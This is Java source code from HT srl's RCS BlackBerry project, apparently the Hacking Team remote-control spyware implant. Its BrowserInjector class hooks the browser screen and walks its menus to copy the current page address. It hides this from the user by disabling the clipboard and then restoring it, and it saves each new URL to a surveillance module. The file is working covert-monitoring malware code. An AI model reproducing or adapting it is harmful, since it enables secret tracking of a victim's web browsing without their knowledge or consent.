//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import net.rim.device.api.system.Clipboard;
import net.rim.device.api.ui.Screen;
import blackberry.Device;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.BrowserMenu;
import blackberry.injection.MenuWalker;
import blackberry.injection.injectors.group.UrlGroupInjector;
import blackberry.module.ModuleUrl;

public class BrowserInjector extends UrlGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("BrowserInjector",
            DebugLevel.VERBOSE);
    private Object lastUrl;

    //#endif

    public String getAppName() {
        //TODO: in messages
        return "Browser";
    }

    public String getCodName() {
        //TODO: in messages
        return "net_rim_bb_browser_daemon";
    }

    public String[] getWantedScreen() {
        //TODO: in messages
        return new String[] {
                "net.rim.device.apps.internal.browser.page.BrowserScreen",
                "net.rim.device.apps.internal.browser.ui.BrowserScreen" };
    }

    public void playOnScreen(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif    

        if (Device.getInstance().lessThan(6, 0)) {
            urlByContext(screen);
        } else {
            urlByCopy(screen);
        }
    }

    public void urlByContext(Screen screen) {
        //TODO: in messages
        String menuName = "Copy Page Address";
        BrowserMenu menu = new BrowserMenu(this, menuName);
        menu.addMenu();
        boolean ret = MenuWalker.walk(menuName, screen, true);
        if (ret) {

        }

        menu.removeMenu();
    }

    public void urlByCopy(Screen screen) {
        //#ifdef DEBUG
        debug.trace("playOnScreen: " + screen);
        //#endif    

        //TODO: in messages
        String[] menuName = new String[] { "Copy Page Address", "Copy Address" };

        disableClipboard();
        boolean ret = MenuWalker.walk(menuName, screen, true);

        if (ret) {

            String url = (String) Clipboard.getClipboard().get();
            setClipboard(url);
            if (url != null) {
                //#ifdef DEBUG
                debug.trace("playOnScreen, URL FOUND:" + url);
                //#endif
                saveUrl(url);
            }
        } else {
            //#ifdef DEBUG
            debug.error("playOnScreen: no Copy Address, wrong screen");
            //#endif

        }
        enableClipboard();

    }

    public void saveUrl(String url) {
        //#ifdef DEBUG
        debug.trace("saveUrl");
        //#endif

        if (url != null) {
            if (!url.equals(lastUrl)) {
                lastUrl = url;
                //#ifdef DEBUG
                debug.info("NEW URL: " + url);
                //#endif

                ModuleUrl.getInstance().saveUrl(url);
            } else {
                //#ifdef DEBUG
                debug.trace("playOnScreen: same url");
                //#endif
            }

        }
    }

}
